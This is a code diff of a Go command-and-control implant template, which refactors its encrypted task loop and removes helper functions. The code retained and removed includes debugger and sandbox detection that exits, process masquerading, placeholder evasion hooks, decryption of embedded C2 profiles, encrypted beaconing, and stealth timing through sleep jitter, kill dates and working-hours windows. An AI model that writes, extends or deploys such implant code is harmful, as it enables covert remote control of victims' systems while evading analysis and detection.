@@ -3,32 +3,14 @@ package main
 import (
 	crand "crypto/rand"
 	"encoding/binary"
-	"math/rand"
 	"net"
 	"os"
-	"path/filepath"
 	"runtime"
-	"sync"
-	"time"
 
 	"__NAME__/crypto"
 	"__NAME__/impl"
 	"__NAME__/protocol"
 	// __EVASION_MAIN_IMPORT__
-)
-
-// ─── Global state ──────────────────────────────────────────────────────────────
-
-var (
-	agent impl.AgentImpl
-	jobs  = impl.NewJobsController()
-
-	stateMu     sync.RWMutex
-	agentSleep  int   // seconds
-	agentJitter int   // 0-90 %
-	killDate    int64 // unix timestamp; 0 = disabled
-	workStart   int   // HHMM e.g. 900
-	workEnd     int   // HHMM e.g. 1700
 )
 
 // ─── Entry point ───────────────────────────────────────────────────────────────
@@ -38,23 +20,17 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Create the agent implementation.
 	agent = impl.New()
 
-	// Anti-analysis: user-defined debugger/sandbox detection.
 	if agent.IsDebugged() {
 		os.Exit(0)
 	}
 
-	// Process masquerade: user-defined technique.
 	agent.Masquerade()
-
-	// Custom startup hook: user-defined initialization.
 	agent.OnStart()
 
 	// __EVASION_INIT__
 
-	// Iterate profiles: decrypt, parse, connect.
 	for _, blob := range encProfiles {
 		if len(blob) == 0 {
 			continue
@@ -66,20 +42,6 @@ func main() {
 		crypto.SKey = sessionKey
 		initProfileState(&profile)
 		run(&profile, sessionKey)
-	}
-}
-
-// initProfileState seeds the global stealth state from the embedded profile.
-func initProfileState(p *protocol.Profile) {
-	stateMu.Lock()
-	defer stateMu.Unlock()
-	agentSleep = p.Sleep
-	agentJitter = p.Jitter
-	killDate = p.KillDate
-	workStart = p.WorkStart
-	workEnd = p.WorkEnd
-	if agentSleep <= 0 {
-		agentSleep = 5
 	}
 }
 
@@ -138,18 +100,8 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 		}
 		waitForWorkingHours()
 
-		data, err := protocol.RecvMsg(conn)
-		if err != nil || data == nil {
-			return
-		}
-
-		plaintext, err := crypto.DecryptData(data, sessionKey)
+		in, err := recvMessage(conn, sessionKey)
 		if err != nil {
-			return
-		}
-
-		var in protocol.Message
-		if err := protocol.Unmarshal(plaintext, &in); err != nil {
 			return
 		}
 		if in.Type != 1 {
@@ -159,17 +111,7 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 
 		responses := TaskProcess(in.Object)
 		if len(responses) > 0 {
-			outMsg, err := protocol.Marshal(protocol.Message{Type: 1, Object: responses})
-			if err != nil {
-				return
-			}
-
-			enc, err := crypto.EncryptData(outMsg, sessionKey)
-			if err != nil {
-				return
-			}
-
-			if err := protocol.SendMsg(conn, enc); err != nil {
+			if err := sendMessage(conn, sessionKey, 1, responses); err != nil {
 				return
 			}
 
@@ -183,17 +125,7 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 			continue
 		}
 
-		outMsg, err := protocol.Marshal(protocol.Message{Type: 2, Object: jobResponses})
-		if err != nil {
-			return
-		}
-
-		enc, err := crypto.EncryptData(outMsg, sessionKey)
-		if err != nil {
-			return
-		}
-
-		if err := protocol.SendMsg(conn, enc); err != nil {
+		if err := sendMessage(conn, sessionKey, 2, jobResponses); err != nil {
 			return
 		}
 
@@ -260,99 +192,6 @@ func buildInitMessage(profile *protocol.Profile, sessionKey []byte) ([]byte, err
 
 func randomUint32() uint32 {
 	var buf [4]byte
-	if _, err := crand.Read(buf[:]); err != nil {
-		return uint32(rand.Int31())
-	}
+	_, _ = crand.Read(buf[:])
 	return binary.BigEndian.Uint32(buf[:])
-}
-
-func localIPv4() string {
-	ifaces, err := net.Interfaces()
-	if err != nil {
-		return ""
-	}
-	for _, iface := range ifaces {
-		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
-			continue
-		}
-		addrs, err := iface.Addrs()
-		if err != nil {
-			continue
-		}
-		for _, addr := range addrs {
-			ipNet, ok := addr.(*net.IPNet)
-			if !ok || ipNet.IP == nil {
-				continue
-			}
-			if v4 := ipNet.IP.To4(); v4 != nil {
-				return v4.String()
-			}
-		}
-	}
-	return ""
-}
-
-func processName() string {
-	exe, err := os.Executable()
-	if err != nil {
-		return "__NAME__"
-	}
-	return filepath.Base(exe)
-}
-
-// ─── Stealth helpers ───────────────────────────────────────────────────────────
-
-func sleepWithJitter() {
-	stateMu.RLock()
-	base := agentSleep
-	jit := agentJitter
-	stateMu.RUnlock()
-
-	if base <= 0 {
-		return
-	}
-	ms := base * 1000
-	if jit > 0 && jit <= 90 {
-		delta := ms * jit / 100
-		ms += rand.Intn(2*delta+1) - delta
-		if ms < 0 {
-			ms = 100
-		}
-	}
-	time.Sleep(time.Duration(ms) * time.Millisecond)
-}
-
-func shouldExit() bool {
-	stateMu.RLock()
-	kd := killDate
-	stateMu.RUnlock()
-	return kd > 0 && time.Now().Unix() > kd
-}
-
-func waitForWorkingHours() {
-	for {
-		stateMu.RLock()
-		ws := workStart
-		we := workEnd
-		stateMu.RUnlock()
-
-		if ws == 0 && we == 0 {
-			return // no restriction
-		}
-
-		now := time.Now()
-		hhmm := now.Hour()*100 + now.Minute()
-		if ws <= we {
-			// Normal window: e.g., 0900–1700
-			if hhmm >= ws && hhmm < we {
-				return
-			}
-		} else {
-			// Overnight window: e.g., 2200–0600
-			if hhmm >= ws || hhmm < we {
-				return
-			}
-		}
-		time.Sleep(60 * time.Second)
-	}
 }
